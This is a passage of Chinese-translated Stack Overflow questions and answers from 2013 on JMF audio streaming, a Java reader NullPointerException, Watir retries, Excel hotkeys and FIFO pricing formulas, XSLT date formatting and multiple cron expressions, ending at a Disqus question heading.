    public class MediaConverterExample extends Frame implements ActionListener
      {

Button st_stream;
static MediaConvertion mdcon;

    public static void main(String args[])throws IOException,NoProcessorException, CannotRealizeException, NoDataSinkException,MalformedURLException,NoDataSourceException
     {
   Format input1 = new AudioFormat(AudioFormat.MPEGLAYER3);
         Format input2 = new AudioFormat(AudioFormat.MPEG);
         Format output = new AudioFormat(AudioFormat.LINEAR);
         PlugInManager.addPlugIn(
       "com.sun.media.codec.audio.mp3.JavaDecoder",
       new Format[]{input1, input2},
      new Format[]{output},
      PlugInManager.CODEC
   );
    File mediaFile = new File(args[1]);
    DataSource source = Manager.createDataSource(new MediaLocator(mediaFile.toURL()));
    mdcon=new MediaConvertion(args[0]);
     mdcon.setDataSource(source);
new MediaConverterExample();
    }

public MediaConverterExample()
{
    st_stream=new Button("Start Streaming");
    add(st_stream);
    st_stream.addActionListener(this);
    setVisible(true);
    setSize(200,300);

}
public void actionPerformed(ActionEvent ae)
{   
    try
    {
    mdcon.startTransmitting();
    }
    catch(Exception e){
    }
   }
   } 
```

这是客户端代码

```
import javax.media.*;
import java.io.File;
import java.io.IOException;
import java.net.URL;
import java.net.MalformedURLException;

import javax.swing.*;
import java.awt.*;
import java.awt.event.*;

import javax.media.format.*;

public class PlayerExample extends JFrame implements ActionListener
{
Button play;
 SimpleAudioPlayer sap;

    PlayerExample(String playFile) throws IOException,NoPlayerException, CannotRealizeException
    {
        sap=new SimpleAudioPlayer(new MediaLocator(playFile));
        setLayout(new BorderLayout());
        //add(sap.VideoComponent(),BorderLayout.CENTER);
        //add(sap.AudioComponent(),BorderLayout.WEST);
        //add(sap.ControlComponent(),BorderLayout.NORTH);
        add(play=new Button("play"),BorderLayout.SOUTH);
        play.addActionListener(this);
        setSize(200,300);
        setVisible(true);       
    }

    public void actionPerformed(ActionEvent ae)
    {

    sap.play();     

    }
     public static void main(String args[])throws IOException,NoPlayerException, CannotRealizeException
    {
        Format input1 = new AudioFormat(AudioFormat.MPEGLAYER3);
                Format input2 = new AudioFormat(AudioFormat.MPEG);
              Format output = new AudioFormat(AudioFormat.LINEAR);
             PlugInManager.addPlugIn(
               "com.sun.media.codec.audio.mp3.JavaDecoder",
              new Format[]{input1, input2},
           new Format[]{output},
             PlugInManager.CODEC
               );

    new PlayerExample(args[0]);
       }
          }

class SimpleAudioPlayer {

private Player videoPlayer = null;

public SimpleAudioPlayer(MediaLocator ml) throws IOException, NoPlayerException, CannotRealizeException  {

                        videoPlayer = Manager.createRealizedPlayer(ml);
                        }

public void play() {
                        //videoPlayer.deallocate();
                        videoPlayer.start();
                        }
public void stop() {
                        videoPlayer.stop();

                        }
       public Component VideoComponent(){
                                return videoPlayer.getVisualComponent();
                        }
     public Component  ControlComponent(){
                        return videoPlayer.getControlPanelComponent();          
                        }
public Component AudioComponent(){
                        return videoPlayer.getGainControl().getControlComponent();
                        }

        } 
```

请帮助我尽我所能。请告知我可能遗漏的任何其他细节，服务器运行良好，但客户端在创建播放器时阻塞。我使用的音频格式是 MPEG_RAW。急切地寻找答案，在此先感谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-21T02:22:12.203

解决了......

我在看甲骨文论坛时想到了

改变

```
 AudioFormat.MPEG_RTP  to AudioFormat.DVI_RTP 
```

不要问mp3为什么不起作用的原因。我尽我所能。

请告诉我为什么以前没有工作。

# jquery - 使用 Web 用户控件或通过 Jquery $.get 加载 HTML 在 ASPX 页面上加载

> ID：16110822
> 
> 赞同：0
> 
> 时间：2013-04-19T18:01:35.453
> 
> 标签：jquery, asp.net, performance, webusercontrol

我有一个相当大的 ASPX 应用程序，它的主页上有许多 Web 用户控件。在过去的几个月里，我已经将 Web 用户控件中的所有服务器端功能迁移到 AJAX 和客户端脚本。目前，我有只显示 HTML 内容的 web 用户控件，因为我想保持主页的复杂性和模块化。

将现有的 Web 用户控件转换为简单的 HTML 文件并使用 $.get 加载它们会更好，还是会对性能产生负面影响？将 Web 用户控件更改为 HTML 并通过 jquery 加载有什么缺点吗？

# java - 全局从缓冲读取器流中读取

> ID：16110824
> 
> 赞同：0
> 
> 时间：2013-04-19T18:01:36.160
> 
> 标签：java, stream

所以我试图编写这个类，它将解析一个文件并从中读取命令。

我希望 ctor 只打开流而不做其他任何事情。而我在其他类方法中解析文件。但是当我尝试以我制作的方法读取文件时，我得到了一个空指针异常。

帮助将被赞赏：D

```
public class Parser {
private BufferedReader _input;
private String _command;

public Parser(String filename) throws FileNotFoundException {
    FileInputStream fstream = new FileInputStream(filename);

    BufferedReader _input = new BufferedReader(new InputStreamReader(fstream));
}

public boolean hasMoreCommands() throws IOException {

    String line;
    if ( (line = _input.readLine()) != null) {
        return true;
    } else {
        _input.close();
        return false;
    }
}

public void advance() throws IOException {
    String line;
    do {
        line = _input.readLine().trim();
    } while (line.equals("") || line.substring(0,2).equals(COMMENT_SIGN)); 

    String[] splittedLine = line.split(COMMENT_SIGN);
    _command = splittedLine[0];
    _command = _command.replace(" ", ""); 
} 
```

我的主要测试+异常跟踪

```
public static void main(String[] args) throws IOException {
    Parser input = null;
    input = new Parser("D:\\test.asm");
    System.out.println( input.hasMoreCommands()); 
```

}

```
Exception in thread "main" java.lang.NullPointerException
at nand6.Parser.hasMoreCommands(Parser.java:40)
at nand6.Parser.main(Parser.java:116) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T18:21:19.307

看看这段代码

```
public Parser(String filename) throws FileNotFoundException {
FileInputStream fstream = new FileInputStream(_filename);

BufferedReader _input = new BufferedReader(new InputStreamReader(fstream));
} 
```

改变

```
BufferedReader _input = new BufferedReader(new InputStreamReader(fstream)); 
```

至

```
_input = new BufferedReader(new InputStreamReader(fstream)); 
```

您的错误：您正在创建另一个***BufferedReader _input***类型的局部变量，因此您的类级别变量仍然为 null 导致***NullPointerException***

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T18:21:52.303

您基本上是在构造函数中定义一个名为“_input”的新 BufferedReader 对象。你认为在调用构造函数之后你在构造函数之外实例化了“_input”。但你不是，它指的是null。这就是你得到 NullPointerException 的原因。只需在构造函数中删除“_input”前面的“BufferedReader”，以便引用正确的对象。

# ruby - 在 Watir 出现超时错误后重试测试站点

> ID：16110828
> 
> 赞同：1
> 
> 时间：2013-04-19T18:01:47.530
> 
> 标签：ruby, timeout, watir, rescue

我正在浏览一个站点列表，并使用 Watir 在每个页面的源代码中查找每个站点。但是，在大约 20 或 30 个站点之后，浏览器在加载某个页面时超时，它破坏了我的脚本，我收到了这个错误：

> rbuf_fill：执行已过期（Timeout::Error）

我正在尝试实现一种方法来检测它何时超时，然后从它停止但遇到问题的地方重新开始测试站点。这是我的代码：

```
ie = Watir::Browser.new :firefox, :profile => "default"
testsite_array = Array.new
y=0
File.open('topsites.txt').each do |line|
testsite_array[y] = line
y=y+1
end
total = testsite_array.length
count = 0
begin
    while count <= total
        site = testsite_array[count]
        ie.goto site
        if ie.html.include? 'teststring'
            puts site + ' yes'
        else
            puts site + ' no'
        end

rescue
retry
    count = count+1
    end
end
ie.close 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-19T18:39:55.890

您的循环可以是：

```
#Use Ruby's method for iterating through the array
testsite_array.each do |site|
    attempt = 1
    begin
        ie.goto site
        if ie.html.include? 'teststring'
            puts site + ' yes'
        else
            puts site + ' no'
        end 
    rescue
        attempt += 1

        #Retry accessing the site or stop trying
        if attempt > MAX_ATTEMPTS
            puts site + ' site failed, moving on'
        else
            retry
        end
    end
end 
```

# ios - UITextField 在开始编辑时向左移动文本

> ID：16110829
> 
> 赞同：0
> 
> 时间：2013-04-19T18:01:48.513
> 
> 标签：ios, uitextfield

UITextField 在开始编辑时将文本向左移动。可以不移动文本吗？文本应该在同一个地方，当它是在编辑之前

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T18:13:05.447

这是因为您已将 TextAlignment 设置为 Center 或 Right。

将其更改为

```
[yourTextField setTextAlignment:NSTextAlignmentLeft]; 
```

希望它可以帮助你。

# excel - Excel 加载项：如何删除宏热键

> ID：16110833
> 
> 赞同：0
> 
> 时间：2013-04-19T18:02:00.637
> 
> 标签：excel, add-in, assign

如何从未出现在工具 > 宏 > 宏中的宏中删除热键？

我安装了一个加载项，Excel 自动为其分配了热键“CTRL+U”。我希望 Ctrl+U 保留其原始功能，在单元格中为文本加下划线。

请注意，加载项 (.xla) 是从 Excel 菜单栏运行的——它在工具 > 宏 > 宏中不可见，因此无法从工具 > 宏 > 宏 > 选项更改热键。

我在各种版本的 Excel 中使用此加载项，所以如果说明因版本而异，请告诉我。

谢谢！

附加信息：插件（我写的）没有设置快捷键。它是由 Excel 单方面分配的。

```
Private Sub Workbook_Open()
  Set XLApp = New clsExcelEvents  ' start monitoring events
  Set SC = New clsStatementConverter  ' initialize some variables
  If CountVisibleWorkbooks > 0 Then
     Call SetMenuOptions  ' update the menu bar
  End If  
End Sub 
```

设置菜单选项（）：

```
Public Sub SetMenuOptions(Optional IsDisableOptions As Boolean = False)
' Set the enabled/disabled status of the "Convert to QB" menu options
'
' If config files exist in the same directory as the current workbook,
'   enable the menu options. Otherwise, disable.
' To force the sub-menu to be disabled (last visible workbook is
'   being closed), set IsDisableOptions to True
'
On Error GoTo Error_Handler
Dim blnEnableOptions As Boolean
' Default to menu options not enabled
blnEnableOptions = False
Application.ScreenUpdating = False
'
' Is a visible workbook open?
If (Not IsDisableOptions) And (Not ActiveWorkbook Is Nothing) Then
  ' Yes, there is an active workbook. Are any of my config files in
  ' the same directory as this workbook?
  Dim aryFiles() As String
  aryFiles = GetListOfConfigFiles(ActiveWorkbook.Path)
  ' Are there any files? (is the array initialized?)
  If IsInitializedArray(aryFiles) Then
    If (UBound(aryFiles) > 0) Then
      ' Yes, there is at least one config file
      blnEnableOptions = True
    End If
  End If
End If
'
' If disable: set all options to disabled, except for the "About..."
' If enable: (1) set all _installed_ converters to enabled (if a converter
'                has not been installed, don't enable it)
'            (2) enable all other menu options
'            (3) rebuild the list of config files
Dim cbcMenu As CommandBar
Dim cbcConverterMenu As CommandBarControl
Dim cbcViewConfigMenu As CommandBarControl
Dim cbcControl As CommandBarControl
Dim blnMenuIsInstalled As Boolean
'
Set cbcMenu = Application.CommandBars("Worksheet Menu Bar")
'
' Is the Converter menu installed?
' This Sub is called after the menu is deleted (when the add-in is uninstalled), so
' trap for the menu not existing before enabling/disabling the sub-menu options, below
blnMenuIsInstalled = False
For Each cbcControl In cbcMenu.Controls
  If cbcControl.Caption = "&Convert to QB" Then
    blnMenuIsInstalled = True
  End If
Next
'
If blnMenuIsInstalled Then
  Set cbcConverterMenu = cbcMenu.Controls("&Convert to QB")
  Set cbcViewConfigMenu = cbcConverterMenu.Controls("View config...")
  '
  ' Step 1: Disable/Enable the controls for this menu
  '   If Disable, then disable all controls except "About"
  '   If Enable, then enable all controls for which converters are installed
  For Each cbcControl In cbcConverterMenu.Controls
    ' Keep "About" enabled
    If cbcControl.Caption <> "About..." Then
      cbcControl.Enabled = blnEnableOptions
    End If
  Next
  '
  ' Step 2: Rebuild the list of config files
  If blnEnableOptions Then
    ' If a system configuration file exists in the ActiveWorkbook directory, read it
    SC.ConfigFilePath = ActiveWorkbook.Path & Application.PathSeparator
    ' Test for the system config filename
    SC.SystemConfigFilename = GetConfigFilename(SC, True)
    ' Was a system config file found?
    If SC.SystemConfigFilename <> "" Then
      ' Yes, get user settings from the config file
      Call GetConfigSettings(SC.ConfigFilePath, SC.SystemConfigFilename)
    End If
    '
    ' Delete the existing menu options to view config files
    For Each cbcControl In cbcViewConfigMenu.Controls
      cbcControl.Delete
    Next
    ' Add a menu option to view for each config file
    Dim lCtr As Long, strMenuItem As String
    For lCtr = 1 To UBound(aryFiles)
      strMenuItem = aryFiles(lCtr)
      With cbcViewConfigMenu
        .Controls.Add(type:=msoControlButton).Caption = strMenuItem
        .Controls(strMenuItem).OnAction = "'ThisWorkbook.ViewTextFile """ & strMenuItem & """'"
      End With
    Next
  End If
End If
Application.ScreenUpdating = True
GoTo Exit_Handler

Error_Handler:
  MsgBox Err.Number, "SetMenuOptions", Err.Description, Err.HelpFile, Err.HelpContext
  GoTo Exit_Handler

Exit_Handler:
  Exit Sub

End Sub 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2018-04-25T19:02:54.643

**单击文件 > 选项 > 自定义功能区** ，然后按照以下说明进行添加或删除或快捷方式：https: [//support.office.com/en-us/article/customize-keyboard-shortcuts-9a92343e-a781-4d5a-92f1-0f32e3ba5b4d](http://Instructions%20for%20Add/Remove%20Shortcuts)

如果您创建了功能区，则快捷方式应显示在“自定义功能区”选项卡下。如果一切都失败了，您总是可以将原始快捷方式重新分配给其他东西，并且不要与新的 Excel 快捷方式分配发生冲突。

# ruby-on-rails - 将所有属性默认为simple_form中的包装器html？

> ID：16110836
> 
> 赞同：0
> 
> 时间：2013-04-19T18:02:01.937
> 
> 标签：ruby-on-rails, simple-form

因为 DOM 子级始终可以通过其父级访问，所以我希望始终应用`:class`并`:data`应用于包装器。例如，

```
<%= f.input :name, :class => :half %> 
```

应该产生与

```
<%= f.input :name, :wrapper_html => { :class => :half } %> 
```

我希望在 simple_form.rb 中更改它，例如：

```
config.item_wrapper_class = :class 
```

但没有运气。是通过自定义构建器实现这一目标的唯一方法吗？如果是这样，我将如何在自定义构建器中实现这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-23T15:14:31.970

您需要编写自己的表单构建器来执行此操作，并且根据您的描述，您希望行为与 simple_form 足够不同，我不确定使用 simple_form 是否有意义 - 您可能只是想要滚动您自己的表单构建器堆栈。

您必须查找如何滚动您自己的表单构建器，我没有这样做。

也就是说，一个好的解决方法可能是，如果您关心的只是如何将类和数据属性放在包装器上而没有太多的哈希嵌套，您可以从简单的表单中省略包装器并直接提供您自己的包装元素。我认为如果您要在每个课程上放置课程等，那会更干净。例如，使用haml：

```
.input.quarter{:data => { :foo => :bar }}
  = f.input :foo, :wrapper => false 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T19:05:28.090

您可以使用这样的标签包装输入：

```
## Inputs
b.use :label
b.wrapper :default, :tag => 'div', :class => 'controls' do |ba|
  ba.use :input
  ba.use :error, :wrap_with => { :tag => 'span', :class => 'label label-important' }
  ba.use :hint,  :wrap_with => { :tag => 'p', :class => 'help-block' } 
```

# excel - 当前价格（按离散值的累积进度）

> ID：16110842
> 
> 赞同：1
> 
> 时间：2013-04-19T18:02:20.373
> 
> 标签：excel, excel-formula

我必须在 Excel 中实现一组公式，这些公式的要求似乎无法用任何合乎逻辑或简洁的方式只用公式来完成。

## 简短的介绍：

确定（并显示）产品每天“有效”内部成本的时间表，基于 1）作为一系列批量购买的产品支付的价格，以及 2）公司使用支付的价格每天消耗的产品对于每次购买，直到消耗完购买的金额，然后继续进行下一次购买。

## 简化细节：

我们有一张“PurchSums”表格，其中包含产品的批量购买历史记录：（这实际上是一个数据透视表）

```
 |          A |       B  |      C |      D  |
1: Product Name Purch Date     Rate   Amount
    ...
23: Prod-Q      12/18/2012    $3.15    123.7
24:              1/24/2013    $3.05    748.2
25:              2/27/2013    $2.86    650.0
...             ... 
```

所以最初，内部价格应该是 3.15 美元/磅，直到我们使用前 123.7 磅，然后它应该切换到 3.05 美元，依此类推。

我们有一张按天计算的“数量”表：（产品消费从 3 月 1 日开始）

```
 |          A |     B  |      C |      D |
1: Product Name 3/1/2013 3/2/2013 3/3/2013  ...
    ...
12: Prod-Q         87.2     77.1    101.5   ...
...             ... 
```

我需要填写每日价格表“价格”的公式，其中包含产品每天的有效内部价格（现在手动填写）：

```
 |          A |     B  |      C |      D |
1: Product Name 3/1/2013 3/2/2013 3/3/2013  ...
    ...
32: Prod-Q         3.15      3.15    3.05   ...
...             ... 
```

*请注意，“Prod-Q”的价格更改为`3.05`3 月 3 日。这是因为它的累计消费达到了 265.8 磅（87.2 + 77.1 + 101.5），超过了 12/18 购买的 123.7 磅，因此`3.15`从 1/24 的价格转换为下一次购买的价格。*

## 更多细节：

如果有帮助，第一张表“PurchSums”实际上是一个数据透视表。不幸的是，我不认为它确实如此，GETPIVOTDATA(..) 在这里也不会有用（但我很乐意犯错）。其中的信息来自另一张“采购”表，它只是所有采购的清单：

```
 |          A |       B  |      C |      D  |
1: Product Name Purch Date     Rate   Amount
    ...
11: Prod-Q      12/18/2012    $3.15    123.7
    ...
34: Prod-Q       1/24/2013    $3.05    748.2
    ...
67: Prod-Q       2/27/2013    $2.86    650.0
    ... 
```

## 额外的：

首先，我想尽可能使用现有单元格/工作表中的公式来执行此操作。另外，我想尽量减少必须添加的额外工作表的数量来支持这一点，因为工作簿已经相当可观了。

其次，是的，我知道我可以使用 VBA 函数来做到这一点，如果没有更好的方法，我会这样做，但如果可能的话，我想避免这种情况，因为根据我的经验，用大量 VBA 函数调用填充大工作表的公式可能会导致一些重大的性能问题。

对于如何有效解决此问题的任何想法，我将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-23T20:24:00.760

假设您知道如何：

*   在数据透视表的每一行上显示产品名称
*   `Amount`从数据透视表的值中提取下限和上限区间点
*   `Volumes`每个产品的正确行中所有前几天的总和
*   涵盖边缘情况，例如超出定义数量间隔的卷
*   使用 Office 2007+ 表格
*   使用命名范围
*   ...

第一天，您希望最高价格 = 给定产品名称的第一行：

```
=INDEX(PurchSums[Rate], MATCH(this_row_product_name, PurchSums[Product Name], 0)) 
```

对于每隔一天，您希望对所有前几天进行求和，并从给定产品名称的`Volumes`匹配间隔 s 中提取比率：`Amount`

```
=SUMIFS(PurchSums[Rate],
 PurchSums[Product Name], this_row_product_name,
 PurchSums[Amount above], TEXT(sum_of_previous_volumes_for_product, "<=General"),
 PurchSums[Amount up to], TEXT(sum_of_previous_volumes_for_product, ">General")) 
```

请注意，`sum_of_previous_volumes_for_product > PurchSums[Amount above]`所有其他条件仅应在 1 行中满足，因此我们**恰好求和 1 行**。

**例子：**

![基于先前列的累积总和提取速率的公式](https://i.stack.imgur.com/CvQgR.png)

对于单元格`E16`，命名范围将被替换/指向：

*   this_row_product_name = `Prices[[#This Row],[Product Name]]`= `Prices[@Product Name]`=`$B16`
*   sum_of_previous_volumes_for_product = `=SUM(OFFSET(Volumes[[#Headers],[2013-03-01]:[2013-03-02]], MATCH(this_row_product_name, Volumes[Product Name], 0), 0))`=`SUM($C12:D12)`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-19T22:12:39.773

所以你所描述的是一个先进先出的库存会计系统。先进先出。你可能想在这里阅读它：

[http://en.wikipedia.org/wiki/FIFO_and_LIFO_accounting](http://en.wikipedia.org/wiki/FIFO_and_LIFO_accounting)

和这里：

[http://accountingexplained.com/financial/inventories/fifo-method](http://accountingexplained.com/financial/inventories/fifo-method)

基本上，在 FIFO 下，您假设（无论是对还是错）您添加到库存中的第一个项目是您将在生产中用完的第一个项目。与 LIFO 相反，它假设您添加到库存中的最后一个项目是您将用完的第一个项目。那只需要对我的解决方案进行一点改动，但让我们专注于 FIFO，因为这是您的问题。

因此，对于您运营的每一天，您都需要弄清楚您用尽了多少库存以及为该库存支付了多少。因此，如果您以 50 美元的价格购买了 20 件商品，然后第二天以 100 美元的价格购买了 20 件商品 - 第三天您在生产中用完了 30 件商品，您用完了 (20 * $50 ) 加上 (10 * $100 ) = 价值 2000 美元的库存。2000 / 30 = 您当天产品的有效成本 (66.6666667)。这个有效成本纯粹是当天的信息 - 你可能不想将它用于任何会计 - 尽管你可以进行一些四舍五入更正 - 这只是一种间接的方式。

所以我的解决方案使用了一个非常丑陋的表。基本上，对于您运营的每一天，您都需要计算出您使用了多少库存以及您为该库存支付了多少 - 然后将其除以当天用完的总金额。像这样的东西应该适合你：

```
=(IF(AND($E8>G$4,$E8>G$5),G$3,0)+IF(AND($E8>G$4,$E8<G$5),($E8-G$4),0))-SUM(G$7:G7) 
```

![示例 1](https://i.stack.imgur.com/wpVYa.png)

```
=(IF(AND($E9>G$4,$E9>G$5),G$3,0)+IF(AND($E9>G$4,$E9<G$5),($E9-G$4),0))-SUM(G$7:G8) 
```

![Example1andhalf](https://i.stack.imgur.com/DCZdv.png)

```
=G8*$C8 
```

![示例 2](https://i.stack.imgur.com/OMO0M.png)

```
=SUM(G13:G15)/G3 
```

![示例 3](https://i.stack.imgur.com/j7gf7.png)

![示例决赛](https://i.stack.imgur.com/DnXQ6.png)

这些公式都是可自动填充的。您可以根据需要在此表上添加尽可能多的空间（并且可能会对其进行相当多的改进）。一个几乎任何语言的小程序都可以比 excel 更容易、更直观地完成这个任务——但这很好用。

在实践中，通常没有人真正知道哪些库存正在被用完，因此您为它们支付了多少。但是这个系统仍然存在——通常许多会计实践的原因与地球上古代人民牺牲动物的原因相同——因为它一直都是这样做的——传统和民间传说。在大多数情况下，它为他们提供了很好的服务——常规的蛋白质来源是健康的。我可以想到一些更好的方法来做到这一点，但是 - 唉。祝你好运。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-19T20:12:38.583

所以基本上你想把你的“PurchSums”表和“Volumes”表总结成一个结合日期字段的表？

如果是这样的话......

在您的摘要表中填写日期

为采购金额创建一列

为体积量制作一列

在购买金额下，使用如下匹配/索引公式：

```
 =index({Select the column C from "PurchSums"},match( {Select date from third sheet},{Select date column from "PurchSums"},0)) 
```

同样，对 Volume 列执行相同的操作。

如果我离你想要完成的事情不远，希望这能让你走上正轨。

# xml - 在 xslt 中格式化日期

> ID：16110848
> 
> 赞同：3
> 
> 时间：2013-04-19T18:02:39.583
> 
> 标签：xml, xslt, xslt-1.0

我正在尝试在 xslt 中格式化某种日期格式。这是格式：

> 2012-7-19

我想将其转换为 xslt 中的数值进行排序，这样上面就变成了：

> 20120719

问题是单个月/天前面没有 0。所以我需要以某种方式在个位数的月份/天之前添加它，而不是在有两位数的月份/天之前。有谁知道我该怎么做？

到目前为止我有这个：

```
<xsl:value-of select="concat(
    substring(substring-after(substring-after(./AirDate, '/'),'/'),0,5),
    substring(substring-after(./AirDate, '/'), 0, 3),
    substring-before(./AirDate, '/'))"/> 
```

但这偶尔会抛出一个`/`个位数的天数，并且不会在个位数的月份/天数前面放一个 0

在将数据源传递给 xslt 之前，我无法更改数据源，我必须使用 xslt 1.0 版。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-19T20:32:28.790

我认为格式编号会解决问题。

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:output method="xml" indent="yes" />

    <xsl:variable name="date" select="'2007-3-19'" />
    <xsl:template name="format_date" >
        <xsl:param name ="date" />
        <xsl:variable name ="year" select="substring-before($date, '-')" />
        <xsl:variable name ="month_and_day" select="substring-after($date, '-')" />
        <xsl:variable name ="day" select="substring-after($month_and_day, '-')" />
        <xsl:variable name ="month" select="substring-before($month_and_day, '-')" />
        <xsl:value-of select="$year"/>
        <xsl:value-of select="format-number($month, '00')"/>
        <xsl:value-of select="format-number($day, '00')"/>
    </xsl:template>

    <xsl:template match="/" >
        <xsl:call-template name="format_date" >
            <xsl:with-param name ="date" select="$date"/>
        </xsl:call-template>
    </xsl:template>
</xsl:stylesheet> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-19T18:44:30.977

我确信即使使用 XSLT 1.0 也有一种更优雅的方法，但这种相当粗暴的解决方案是一种选择：

### 样式表

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="text" version="1.0" encoding="utf-8"/>

  <xsl:variable name="HYPHEN" select="'-'"/>

  <xsl:template name="zero-pad">
    <xsl:param name="number"/>

    <xsl:choose>
      <xsl:when test="string-length($number) = 1">
        <xsl:value-of select="concat('0', $number)"/>
      </xsl:when>
      <xsl:otherwise>
        <xsl:value-of select="$number"/>
      </xsl:otherwise>
    </xsl:choose>
  </xsl:template>

  <xsl:template name="format-date">
    <xsl:param name="date"/>

    <xsl:variable name="year" select="substring-before($date, $HYPHEN)"/>
    <xsl:variable name="month-and-day"
      select="substring-after($date, concat($year, $HYPHEN))"/>

    <xsl:variable name="month">
      <xsl:call-template name="zero-pad">
        <xsl:with-param name="number"
          select="substring-before($month-and-day, $HYPHEN)"/>
      </xsl:call-template>
    </xsl:variable>

    <xsl:variable name="day">
      <xsl:call-template name="zero-pad">
        <xsl:with-param name="number"
          select="substring-after($month-and-day, $HYPHEN)"/>
      </xsl:call-template>
    </xsl:variable>

    <xsl:value-of select="number(concat($year, $month, $day))"/>
  </xsl:template>

  <xsl:template match="/">
    <xsl:call-template name="format-date">
      <xsl:with-param name="date" select="'2012-7-19'"/>
    </xsl:call-template>
  </xsl:template>
</xsl:stylesheet> 
```

### 输出

```
20120719 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-19T20:00:02.100

您可以使用`substring-after`和的组合`substring-before`来提取片段，然后将它们作为数字而不是字符串处理 - 即使用乘法和加法来生成最终值。

像这样的东西：

```
<xsl:variable name="sep" select="'-'"/>
<xsl:variable name="date" select="."/>
<xsl:value-of select="substring-after(substring-after($date, $sep),$sep) + substring-before(substring-after($date, $sep),$sep)*100 + substring-before($date, $sep)*10000"/> 
```

将`sep`and`date`变量分别设置为要使用的分隔符和原始日期字符串（在您的问题中，示例`-`用作分隔符，但 XSLT 使用`/`）

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2013-04-19T18:09:58.327

尝试这个：

```
<xsl:value-of select="concat(substring(date, 7, 4), '-', substring(date, 4, 2), '-', substring(date, 1, 2))"/> 
```

# cronexpression - 如何编写多个 cron 表达式

> ID：16110849
> 
> 赞同：4
> 
> 时间：2013-04-19T18:02:41.433
> 
> 标签：cronexpression

周一到周六晚上 7 点到早上 9 点执行工作，周日全天执行。

我尝试输入多个 cron 表达式，但它不起作用。谁能帮我解决这个问题？

```
1\. " * * 19-8 ? * MON,TUE,WED,THU,FRI,SAT "
2\. " * * * ? * SUN " 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2014-10-07T13:16:56.540

由于您使用的是[Quartz](http://www.quartz-scheduler.org/)，因此您可以创建几个不同的 CronTriggers，并将它们全部安排到您需要的工作中。例如（将 cron 表达式更改为您需要的表达式）

```
SchedulerFactory sf = new StdSchedulerFactory();
Scheduler sched = sf.getScheduler();

JobDetail job = newJob(SimpleJob.class)
    .withIdentity("job1", "group1")
    .build();

Set<Trigger> triggers = new HashSet<>();

CronTrigger trigger = newTrigger()
    .withIdentity("trigger1", "group1")
    .withSchedule(cronSchedule("0/20 * * * * ?"))
    .build();
triggers.add(trigger1);

CronTrigger trigger2 = newTrigger()
    .withIdentity("trigger2", "group1")
    .withSchedule(cronSchedule("15 0/2 * * * ?"))
    .build();
triggers.add(trigger2);

CronTrigger trigger3 = newTrigger()
    .withIdentity("trigger3", "group1")
    .withSchedule(cronSchedule("0 0/2 8-17 * * ?"))
    .build();
triggers.add(trigger3);

scheduler.scheduleJob(job, triggers, false); 
```

您不能使用多个 CronExpressions 创建一个触发器。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T18:17:49.173

我认为看到您的要求的复杂性，我们需要创建 4 cron 表达式来完成您的任务。

// 周一晚上 7 点到 12 点的任务

==>

```
 * 19-24 * * 1  <YOUR_TASK>
    ->* – every Minute 
    ->19-24 hours
    ->* – Every day
    ->* – Every month
    ->1--Mon, 
```

//周二到周五的任务 ==>

```
* 00-24 * * 2-5  <YOUR_TASK>
->* – 0th Minute 
-> 00-24 hours
->* – Every day
->* – Every month
->1-5 -Mon, Tue, Wed, Thu , Fri, Sat 
```

//周六上午 9 点之前的任务 ==>

```
* 00-09 * * 6  <YOUR_TASK>
->00 – every Minute 
->00-09 – upto 9 AM
->* – Every day
->* – Every month
->6 -, Sat 
```

//周六的任务==>

```
 * * * * 7   <YOUR_TASK>
    ->* – Every minute  
    ->00-09 – upto 9 AM
    ->* – Every day
    ->* – Every month
    ->6 -, Sat 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-19T18:26:22.143

[CronMaker](http://cronmaker.com/)是一个实用程序，可帮助您构建 cron 表达式。CronMaker 使用[Quartz](http://www.quartz-scheduler.org/)开源调度器。生成的表达式基于 Quartz cron 格式。

此表达式定义任务的**开始**。它没有定义它的**持续时间**（它属于任务）。

> **`-`**用于指定范围。例如，小时字段中的“10-12”表示“10、11 和 12 小时”

[*CronTrigger 教程*](http://www.quartz-scheduler.org/documentation/quartz-1.x/tutorials/crontrigger)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-03-24T04:53:47.537

[cron-utils](http://github.com/jmrozanec/cron-utils)引入了多 cron 表示法：您可以将多个 cron 组合成一个表达式。下面是一个例子：

```
String multicron = "0 0|0|30|0 9|10|11|12 * * ? *";
parser = new CronParser(CronDefinitionBuilder.instanceDefinitionFor(CronType.QUARTZ));
Cron cron = parser.parse(multicron);
assertEquals(multicron, cron.asString()); 
```

cron 表示法与任何常规 cron 相同：在 cron 中保持相同值的字段保持不变。将包含不同值的字段将由管道分隔。

您的两个 crons 可以表示为：

```
"* * 19-8|* ? * MON,TUE,WED,THU,FRI,SAT|SUN" 
```

目前 cron-utils 不支持作业执行，但提供了知道下一个/上一个执行日期的方法。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-08-29T03:52:22.293

如果需要 nodejs，[https://github.com/datasert/cronjs](https://github.com/datasert/cronjs)会执行多 cron 表达式。例如，`* 21-23 * * 2,4,6|* 0-5 * * 1,3,5|* * ? * 7`

*免责声明* 我是构建该库的团队的一员

# ruby-on-rails - Disqus 评论系统 - 评论被保存但页面刷新后没有显示？

> ID：16110851
> 
> 赞同：0
> 
> 时间：2013-04-19T18:02:46.207
> 
